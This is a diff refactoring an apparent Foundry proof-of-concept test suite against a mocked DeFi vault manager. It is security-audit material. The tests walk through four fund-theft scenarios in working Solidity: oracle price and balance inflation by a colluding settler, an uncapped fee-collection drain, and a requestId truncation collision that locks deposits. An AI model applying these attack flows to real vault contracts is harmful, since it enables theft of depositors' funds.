@@ -16,15 +16,15 @@ interface ITypes {
     enum AssetType     { BASE, QUOTE, REWARD, OTHER }
 
     struct VaultDetails {
-        string   name;
-        address  proposer;
-        address  omniTrader;
+        string      name;
+        address     proposer;
+        address     omniTrader;
         VaultStatus status;
-        address  executor;
-        address  shareToken;
-        address  dexalotRFQ;
-        uint32[] chainIds;
-        uint16[] tokens;
+        address     executor;
+        address     shareToken;
+        address     dexalotRFQ;
+        uint32[]    chainIds;
+        uint16[]    tokens;
     }
     struct AssetInfo {
         bytes32   symbol;
@@ -35,8 +35,8 @@ interface ITypes {
     }
     struct TransferRequest {
         RequestStatus status;
-        uint32  timestamp;
-        uint208 shares;
+        uint32        timestamp;
+        uint208       shares;
     }
     struct RequestLimit {
         uint248 lastBatchId;
@@ -131,8 +131,8 @@ contract MockExecutor is ITypes {
     address public feeManager;
 
     constructor(address p) { portfolio = MockPortfolio(p); }
-    function setManager(address m)   external { omniVaultManager = m; }
-    function setTrader(address t)    external { omniTrader = t; }
+    function setManager(address m)    external { omniVaultManager = m; }
+    function setTrader(address t)     external { omniTrader = t; }
     function setFeeManager(address f) external { feeManager = f; }
 
     function dispatchAssets(address to, bytes32[] calldata syms, uint256[] calldata amts) external {
@@ -140,7 +140,7 @@ contract MockExecutor is ITypes {
         portfolio.bulkTransferTokens(address(this), to, syms, amts);
     }
 
-    // BUG: no cap -- trader can claim arbitrary amount as fees
+    // BUG: no cap on total fees claimed
     function collectSwapFees(
         bytes32 feeSymbol,
         uint256[] calldata swapIds,
@@ -165,16 +165,16 @@ contract VaultManagerHarness is ITypes {
     uint256 public constant MAX_USER_PENDING_REQUESTS  = 5;
     uint256 public constant MIN_SHARE_MINT             = 1000e18;
 
-    address public admin;
-    address public settler;
+    address       public admin;
+    address       public settler;
     MockPortfolio public portfolio;
 
     uint256 public vaultIndex;
     mapping(uint256 => VaultDetails) public vaults;
 
     uint16 public tokenIndex;
-    mapping(uint16 => AssetInfo) public assetInfo;
-    mapping(bytes32 => bool) tokenExists;
+    mapping(uint16  => AssetInfo)      public assetInfo;
+    mapping(bytes32 => bool)                   tokenExists;
 
     mapping(address => uint80)          public userNonce;
     mapping(bytes32 => TransferRequest) public requests;
@@ -211,7 +211,6 @@ contract VaultManagerHarness is ITypes {
         tokenExists[a.symbol] = true;
     }
 
-    // renamed param from _vid to vaultId_ to avoid shadow with _vid()
     function registerVault(
         uint16 vaultId_,
         VaultDetails calldata vd,
@@ -286,11 +285,10 @@ contract VaultManagerHarness is ITypes {
             delete requests[d.depositRequestId];
             pendingCount--;
             if (!d.process) { _refund(d.depositRequestId, d.tokenIds, d.amounts); continue; }
-            uint16 dVid = uint16(_vid(d.depositRequestId));
-            uint256 sharesToMint = _calcMint(dVid, d.tokenIds, d.amounts);
-            // fix: uint256 -> address(uint160(...)) -> MockShare
+            uint16  dVid  = uint16(_vid(d.depositRequestId));
+            uint256 mints = _calcMint(dVid, d.tokenIds, d.amounts);
             address stAddr = address(uint160(_tload(keccak256(abi.encode("ST", dVid)))));
-            MockShare(stAddr).mint(dVid, user, sharesToMint);
+            MockShare(stAddr).mint(dVid, user, mints);
         }
         require(dHash == batchDepositHash[prev]);
 
@@ -307,10 +305,10 @@ contract VaultManagerHarness is ITypes {
                 MockShare(vaults[wVid].shareToken).transfer(user, req.shares);
                 continue;
             }
-            uint256 ts  = _tload(keccak256(abi.encode("TS",  wVid)));
-            uint256 len = _tload(keccak256(abi.encode("TL",  wVid)));
+            uint256 ts  = _tload(keccak256(abi.encode("TS", wVid)));
+            uint256 len = _tload(keccak256(abi.encode("TL", wVid)));
             bytes32[] memory syms = new bytes32[](len);
-            uint256[] memory amts  = new uint256[](len);
+            uint256[] memory amts = new uint256[](len);
             for (uint256 t = 0; t < len; t++) {
                 uint16  tid = uint16(_tload(keccak256(abi.encode("TID", wVid, t))));
                 uint256 bal = _tload(keccak256(abi.encode("BAL", wVid, tid)));
@@ -326,7 +324,6 @@ contract VaultManagerHarness is ITypes {
 
     // ---- internals -----------------------------------------------------------
 
-    // renamed param to vId_ to avoid shadow with _vid()
     function _calcMint(uint16 vId_, uint16[] calldata tids, uint256[] calldata amts) internal view returns (uint256) {
         uint256 usd;
         for (uint256 j = 0; j < tids.length; j++)
@@ -409,14 +406,12 @@ contract FundDrainPoCTest is Test, ITypes {
     address constant SETTLER  = address(0xA1);
     address constant PROPOSER = address(0xA2);
     address constant ALICE    = address(0xA3);
-    address constant BOB      = address(0xA4);
     address constant ATTACKER = address(0xAA);
     address constant TRADER   = address(0xBB);
 
     uint16  constant VID     = 0;
     uint16  constant TID     = 0;
     bytes32 constant SYM     = bytes32("USDC");
-    uint208 constant INIT_SH = 2000e18;
     uint256 constant PRICE_1 = 1e18;
 
     function setUp() public {
@@ -441,46 +436,48 @@ contract FundDrainPoCTest is Test, ITypes {
         uint16[]  memory it = new uint16[](1);  it[0] = TID;
         uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;
         portfolio.setBalance(address(executor), SYM, 1_000_000e6);
-        manager.registerVault(VID, vd, it, ia, INIT_SH);
+        manager.registerVault(VID, vd, it, ia, 2000e18);
         vm.stopPrank();
 
         portfolio.setBalance(ALICE,    SYM, 100_000e6);
-        portfolio.setBalance(BOB,      SYM, 100_000e6);
         portfolio.setBalance(ATTACKER, SYM, 0);
     }
 
-    // -------------------------------------------------------------------------
+    // =========================================================================
     // STEAL-01: SETTLER inflates price -> attacker mints excess shares
-    // -------------------------------------------------------------------------
-    // Attack flow:
-    //   1. Alice deposits 10,000 USDC legitimately.
-    //   2. Attacker deposits 1 USDC.
-    //   3. Colluding SETTLER finalizes with fake price 1 USDC = $10,000.
-    //   4. Settlement mints shares using fake USD value:
-    //      attacker's 1 USDC is treated as $10,000, same as Alice's $10,000.
-    //   5. Attacker now owns ~50% of vault having deposited almost nothing.
-    //   6. Attacker withdraws and drains Alice's funds.
+    // =========================================================================
+    // Flow: Alice deposits 10,000 USDC. Attacker deposits 1 USDC.
+    //       Colluding SETTLER finalizes with fake price $10,000/USDC.
+    //       Attacker's 1 USDC is valued as $10,000 -> same shares as Alice.
+    //       Attacker withdraws and drains Alice's real funds.
     function testSTEAL01_InflatedPriceDrainsVault() public {
         console.log("\n=== STEAL-01: Inflated Price Attack ===");
+        (bytes32 aliceReq, bytes32 atkReq) = _steal01_deposit();
+        _steal01_settleDeposits(aliceReq, atkReq);
+        _steal01_withdrawAndDrain();
+    }
 
+    function _steal01_deposit() internal returns (bytes32 aliceReq, bytes32 atkReq) {
         uint16[]  memory tids = new uint16[](1);  tids[0] = TID;
         uint256[] memory amts = new uint256[](1);
 
         amts[0] = 10_000e6;
         vm.prank(ALICE);
-        bytes32 aliceReq = manager.requestDeposit(VID, tids, amts);
+        aliceReq = manager.requestDeposit(VID, tids, amts);
 
         portfolio.setBalance(ATTACKER, SYM, 1e6);
         amts[0] = 1e6;
         vm.prank(ATTACKER);
-        bytes32 atkReq = manager.requestDeposit(VID, tids, amts);
+        atkReq = manager.requestDeposit(VID, tids, amts);
 
         console.log("[+] Alice deposited:    10,000 USDC");
         console.log("[+] Attacker deposited:      1 USDC");
+    }
 
-        uint256[] memory prices = new uint256[](1); prices[0] = 10_000e18; // FAKE: $10,000 per USDC
-        uint16[]  memory vtids  = new uint16[](1);  vtids[0] = TID;
-        uint256[] memory vbals  = new uint256[](1); vbals[0] = 1_010_001e6;
+    function _steal01_settleDeposits(bytes32 aliceReq, bytes32 atkReq) internal {
+        uint16[]  memory vtids = new uint16[](1);  vtids[0] = TID;
+        uint256[] memory vbals = new uint256[](1); vbals[0] = 1_010_001e6;
+        uint256[] memory prices = new uint256[](1); prices[0] = 10_000e18; // FAKE
         VaultState[] memory vs = new VaultState[](1);
         vs[0] = VaultState(VID, vtids, vbals);
 
@@ -495,62 +492,50 @@ contract FundDrainPoCTest is Test, ITypes {
         uint256[] memory a2 = new uint256[](1); a2[0] = 1e6;
         deps[0] = DepositFufillment(aliceReq, true, t1, a1);
         deps[1] = DepositFufillment(atkReq,   true, t2, a2);
-        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](0);
 
         vm.prank(SETTLER);
-        manager.bulkSettle(prices, vs, deps, wds);
+        manager.bulkSettle(prices, vs, deps, new WithdrawalFufillment[](0));
 
-        uint256 aliceShares   = share.balanceOf(ALICE);
-        uint256 attackerShares = share.balanceOf(ATTACKER);
-        uint256 totalShares   = share.totalSupply();
-        uint256 attackerPct   = (attackerShares * 100) / totalShares;
-        console.log("[+] Alice shares:   ", aliceShares    / 1e18);
-        console.log("[+] Attacker shares:", attackerShares / 1e18);
-        console.log("[EXPLOIT] Attacker owns", attackerPct, "% of vault (deposited only 1 USDC)");
+        uint256 atkPct = (share.balanceOf(ATTACKER) * 100) / share.totalSupply();
+        console.log("[EXPLOIT] Attacker owns", atkPct, "% of vault (deposited only 1 USDC)");
+    }
 
-        // Attacker withdraws
+    function _steal01_withdrawAndDrain() internal {
+        uint256 atkShares = share.balanceOf(ATTACKER);
         vm.prank(ATTACKER);
-        share.approve(address(manager), attackerShares);
+        share.approve(address(manager), atkShares);
         vm.prank(ATTACKER);
-        manager.requestWithdrawal(VID, uint208(attackerShares));
+        manager.requestWithdrawal(VID, uint208(atkShares));
 
-        uint256[] memory prices2 = new uint256[](1); prices2[0] = PRICE_1;
-        uint256[] memory vbals2  = new uint256[](1); vbals2[0]  = 1_010_001e6;
-        VaultState[] memory vs2  = new VaultState[](1);
-        vs2[0] = VaultState(VID, vtids, vbals2);
+        // finalize batch-2 with real price, real balance
+        _finalizeSimple(PRICE_1, 1_010_001e6);
 
-        vm.prank(SETTLER);
-        manager.finalizeBatch(prices2, vs2);
-
-        bytes32 atkWdId = _rid(ATTACKER, VID, 1);
-        WithdrawalFufillment[] memory wds2 = new WithdrawalFufillment[](1);
-        wds2[0] = WithdrawalFufillment(atkWdId, true);
-
-        vm.prank(SETTLER);
-        manager.bulkSettle(prices2, vs2, new DepositFufillment[](0), wds2);
+        // settle the withdrawal
+        _settleWithdrawal(_rid(ATTACKER, VID, 1));
 
         uint256 stolen = portfolio.balances(ATTACKER, SYM);
         console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC (invested 1 USDC)");
-        assertGt(stolen, 100_000e6, "STEAL-01: attacker should drain > 100,000 USDC");
+        assertGt(stolen, 100_000e6, "STEAL-01: attacker drains > 100,000 USDC");
         console.log("[EXPLOIT] STEAL-01 CONFIRMED");
     }
 
-    // -------------------------------------------------------------------------
-    // STEAL-02: SETTLER inflates vault balance -> attacker overdrafts on withdraw
-    // -------------------------------------------------------------------------
-    // Attack flow:
-    //   1. Attacker deposits legitimately and gets small % of shares.
-    //   2. Separate batch: SETTLER lies about vault balance (100x real).
-    //   3. Attacker's withdrawal gets (shares * fakeBalance) / totalShares,
-    //      which far exceeds what the vault actually holds.
+    // =========================================================================
+    // STEAL-02: SETTLER inflates vault balance -> attacker overdrafts withdrawal
+    // =========================================================================
+    // Flow: Attacker deposits 1,000 USDC -> gets ~9% of shares.
+    //       SETTLER lies balance is 100x real on withdrawal batch.
+    //       Attacker's 9% of 100,000,000 USDC > actual vault.
     function testSTEAL02_InflatedBalanceDrainsVault() public {
         console.log("\n=== STEAL-02: Inflated Balance Attack ===");
+        _steal02_depositBatch();
+        _steal02_drainWithFakeBalance();
+    }
 
-        uint16[]  memory tids = new uint16[](1); tids[0] = TID;
-        uint256[] memory amts = new uint256[](1);
-        uint16[]  memory vtids = new uint16[](1); vtids[0] = TID;
+    function _steal02_depositBatch() internal {
+        uint16[]  memory tids  = new uint16[](1);  tids[0]  = TID;
+        uint16[]  memory vtids = new uint16[](1);  vtids[0] = TID;
+        uint256[] memory amts  = new uint256[](1);
 
-        // Batch 0: Attacker + Alice deposit
         portfolio.setBalance(ATTACKER, SYM, 1000e6);
         amts[0] = 1000e6;
         vm.prank(ATTACKER);
@@ -577,27 +562,29 @@ contract FundDrainPoCTest is Test, ITypes {
         deps[1] = DepositFufillment(aliceReq, true, t2, a2);
         vm.prank(SETTLER); manager.bulkSettle(prices, vs, deps, new WithdrawalFufillment[](0));
 
-        uint256 atkShares = share.balanceOf(ATTACKER);
-        uint256 totalSh   = share.totalSupply();
-        console.log("[+] Attacker owns", (atkShares * 100) / totalSh, "% of vault");
+        uint256 atkPct = (share.balanceOf(ATTACKER) * 100) / share.totalSupply();
+        console.log("[+] Attacker legitimately owns", atkPct, "% of vault");
+    }
 
-        // Batch 1: Attacker requests withdrawal, SETTLER lies about balance
+    function _steal02_drainWithFakeBalance() internal {
+        uint256 atkShares = share.balanceOf(ATTACKER);
         vm.prank(ATTACKER);
         share.approve(address(manager), atkShares);
         vm.prank(ATTACKER);
         manager.requestWithdrawal(VID, uint208(atkShares));
 
-        uint256[] memory prices2  = new uint256[](1); prices2[0] = PRICE_1;
-        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 100_000_000e6; // FAKE: 100x
+        // SETTLER lies: real balance ~1,011,000 -> fake 100,000,000
+        uint16[]  memory vtids    = new uint16[](1);  vtids[0]    = TID;
+        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 100_000_000e6;
+        uint256[] memory prices2  = new uint256[](1); prices2[0]  = PRICE_1;
         VaultState[] memory vs2   = new VaultState[](1);
         vs2[0] = VaultState(VID, vtids, fakeBals);
         vm.prank(SETTLER); manager.finalizeBatch(prices2, vs2);
         console.log("[+] SETTLER finalized with FAKE balance: 100,000,000 USDC");
 
-        bytes32 atkWdId = _rid(ATTACKER, VID, 1);
-        WithdrawalFufillment[] memory wds2 = new WithdrawalFufillment[](1);
-        wds2[0] = WithdrawalFufillment(atkWdId, true);
-        vm.prank(SETTLER); manager.bulkSettle(prices2, vs2, new DepositFufillment[](0), wds2);
+        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](1);
+        wds[0] = WithdrawalFufillment(_rid(ATTACKER, VID, 1), true);
+        vm.prank(SETTLER); manager.bulkSettle(prices2, vs2, new DepositFufillment[](0), wds);
 
         uint256 stolen = portfolio.balances(ATTACKER, SYM);
         console.log("[EXPLOIT] Attacker invested:  1,000 USDC");
@@ -606,19 +593,17 @@ contract FundDrainPoCTest is Test, ITypes {
         console.log("[EXPLOIT] STEAL-02 CONFIRMED");
     }
 
-    // -------------------------------------------------------------------------
+    // =========================================================================
     // STEAL-03: collectSwapFees has no cap -> compromised trader drains executor
-    // -------------------------------------------------------------------------
-    // Attack flow:
-    //   1. Compromised TRADER fabricates swap IDs with inflated fee amounts.
-    //   2. No on-chain validation of swap IDs or fee totals.
-    //   3. feeManager is attacker-controlled; all funds transferred out.
+    // =========================================================================
+    // Flow: Compromised TRADER submits fabricated swap IDs with inflated fees.
+    //       No on-chain cap or swap ID validation.
+    //       feeManager is ATTACKER -> entire executor balance drained in one tx.
     function testSTEAL03_CollectSwapFeesDrainsExecutor() public {
         console.log("\n=== STEAL-03: collectSwapFees Unlimited Drain ===");
 
         uint256 execBal = portfolio.balances(address(executor), SYM);
         console.log("[+] Executor balance:", execBal / 1e6, "USDC");
-        console.log("[+] feeManager is ATTACKER-controlled");
 
         uint256[] memory swapIds = new uint256[](1); swapIds[0] = 1;
         uint256[] memory fees    = new uint256[](1); fees[0]    = execBal;
@@ -630,20 +615,19 @@ contract FundDrainPoCTest is Test, ITypes {
         uint256 execBalAfter = portfolio.balances(address(executor), SYM);
         console.log("[EXPLOIT] ATTACKER received:", stolen / 1e6, "USDC");
         console.log("[EXPLOIT] Executor remaining:", execBalAfter / 1e6, "USDC");
-        assertEq(stolen, execBal);
+        assertEq(stolen, execBal, "STEAL-03: all executor funds drained");
         assertEq(execBalAfter, 0);
         console.log("[EXPLOIT] STEAL-03 CONFIRMED");
     }
 
-    // -------------------------------------------------------------------------
-    // STEAL-04: requestId bit-packing collision (fund lockup)
-    // -------------------------------------------------------------------------
-    // Vulnerability:
-    //   requestId = (uint16(vaultId) << 240) | (uint160(user) << 80) | nonce
-    //   vaultId is truncated to uint16. vaultId=65536 (0x10000) truncates to 0.
-    //   If vault 65536 exists, its requests get the same requestId as vault 0
-    //   for the same user + nonce, causing one to silently overwrite the other.
-    //   The overwritten deposit has no requestId to claim -> funds permanently locked.
+    // =========================================================================
+    // STEAL-04: requestId bit-packing collision -> fund lockup
+    // =========================================================================
+    // Vulnerability: requestId = (uint16(vaultId) << 240) | (uint160(user) << 80) | nonce
+    //   vaultId is cast to uint16; vaultId=65536 truncates to 0.
+    //   Vault 65536 and vault 0 share the same requestId namespace for
+    //   the same user + nonce, so one's delete erases the other's deposit record.
+    //   Victim has no requestId to trigger refund -> funds permanently locked.
     function testSTEAL04_RequestIdCollision() public {
         console.log("\n=== STEAL-04: requestId Bit-Packing Collision ===");
 
@@ -653,32 +637,53 @@ contract FundDrainPoCTest is Test, ITypes {
         bytes32 aliceId = manager.requestDeposit(VID, tids, amts);
         console.log("[+] Alice requestId:", vm.toString(aliceId));
 
-        // Confirm encoding
         bytes32 expected = bytes32(
             (uint256(uint16(VID)) << 240) |
             (uint256(uint160(ALICE)) << 80) |
             uint256(0)
         );
-        assertEq(aliceId, expected, "requestId encoding confirmed");
+        assertEq(aliceId, expected, "encoding confirmed");
 
-        // vaultId=65536 truncates to uint16(0) -> same ID as vault 0
-        uint256 OVERFLOW_VID = uint256(type(uint16).max) + 1; // 65536
-        bytes32 collidingId = bytes32(
-            (uint256(uint16(OVERFLOW_VID)) << 240) | // truncates to 0
+        uint256 OVERFLOW_VID = uint256(type(uint16).max) + 1;
+        bytes32 collidingId  = bytes32(
+            (uint256(uint16(OVERFLOW_VID)) << 240) |
             (uint256(uint160(ALICE)) << 80) |
             uint256(0)
         );
-        assertEq(collidingId, aliceId, "vaultId overflow collision confirmed");
+        assertEq(collidingId, aliceId, "collision confirmed");
 
-        console.log("[EXPLOIT] vaultId=65536 truncates to 0 -> identical requestId as vault 0");
-        console.log("[EXPLOIT] Second request deletes first via 'delete transferRequests[id]'");
-        console.log("[EXPLOIT] Alice's 5,000 USDC locked: no requestId -> no refund path");
-        console.log("[EXPLOIT] STEAL-04 CONFIRMED: structural collision, fund lockup guaranteed");
+        console.log("[EXPLOIT] vaultId=65536 truncates to 0 -> same requestId as vault 0");
+        console.log("[EXPLOIT] delete on colliding ID erases Alice deposit record");
+        console.log("[EXPLOIT] Alice 5,000 USDC locked: no requestId -> no refund path");
+        console.log("[EXPLOIT] STEAL-04 CONFIRMED");
     }
 
-    // -------------------------------------------------------------------------
-    // Helpers
-    // -------------------------------------------------------------------------
+    // =========================================================================
+    // Shared helpers
+    // =========================================================================
+
+    function _finalizeSimple(uint256 price, uint256 bal) internal {
+        uint16[]  memory vtids = new uint16[](1);  vtids[0] = TID;
+        uint256[] memory vbals = new uint256[](1); vbals[0] = bal;
+        uint256[] memory prices = new uint256[](1); prices[0] = price;
+        VaultState[] memory vs = new VaultState[](1);
+        vs[0] = VaultState(VID, vtids, vbals);
+        vm.prank(SETTLER);
+        manager.finalizeBatch(prices, vs);
+    }
+
+    function _settleWithdrawal(bytes32 wdId) internal {
+        uint16[]  memory vtids = new uint16[](1);  vtids[0] = TID;
+        uint256[] memory vbals = new uint256[](1); vbals[0] = 1_010_001e6;
+        uint256[] memory prices = new uint256[](1); prices[0] = PRICE_1;
+        VaultState[] memory vs = new VaultState[](1);
+        vs[0] = VaultState(VID, vtids, vbals);
+        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](1);
+        wds[0] = WithdrawalFufillment(wdId, true);
+        vm.prank(SETTLER);
+        manager.bulkSettle(prices, vs, new DepositFufillment[](0), wds);
+    }
+
     function _rid(address user, uint256 vaultId_, uint256 nonce) internal pure returns (bytes32) {
         return bytes32((uint256(uint16(vaultId_)) << 240) | (uint256(uint160(user)) << 80) | nonce);
     }
